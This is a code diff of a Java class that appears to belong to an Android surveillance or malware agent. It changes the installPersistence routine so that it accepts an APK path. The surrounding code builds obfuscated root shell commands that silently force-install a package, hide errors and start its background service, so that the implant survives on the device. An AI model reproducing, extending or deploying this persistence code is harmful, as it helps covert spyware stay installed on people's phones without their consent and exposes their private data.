@@ -480,19 +480,23 @@ public class Root {
 	}
 
 
-	static synchronized boolean installPersistence(Boolean forceInstall) {
+	static synchronized boolean installPersistence(Boolean forceInstall, String apk) {
 		android.content.pm.PackageInfo pi = null;
-		String apkPosition = null;
+
 		Boolean isPersistent = false;
 
-		if ((apkPosition = Status.getApkName()) != null && !Status.isMelt()) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (installPersistence): found apk installed in: " + apkPosition);
+		String apkPosition = null;
+		if(apk == null) {
+			if ((apkPosition = Status.getApkName()) != null && !Status.isMelt()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (installPersistence): found apk installed in: " + apkPosition);
+				}
+			} else {
+				return false;
 			}
-			isPersistent = Status.isPersistent();
-		} else {
-			return false;
 		}
+
+		isPersistent = Status.isPersistent();
 
 		if (isPersistent || Status.persistencyReady()) {
 			if (Cfg.DEBUG) {
@@ -528,7 +532,6 @@ public class Root {
 		command += M.e("chmod 644 ") + perPkg + "\n";
 		command += String.format(M.e("pm install -r -f %s 2>/dev/null"), perPkg) + "\n";
 		command += M.e("sleep 1") + "\n";
-
 		command += M.e("installed=$(pm list packages ") + packageName + ")\n";
 		//command += M.e("if [ ${#installed} -gt 0 ]; then") + "\n";
 		command += M.e("am startservice ") + packageName + M.e("/.ServiceMain") + "\n";
@@ -928,7 +931,7 @@ public class Root {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (installPersistence): actual install PERSISTENCE");
 				}
-				Root.installPersistence(false);
+				Root.installPersistence(false, null);
 				Status.self().setReload();
 			}else{
 				if (Cfg.DEBUG) {
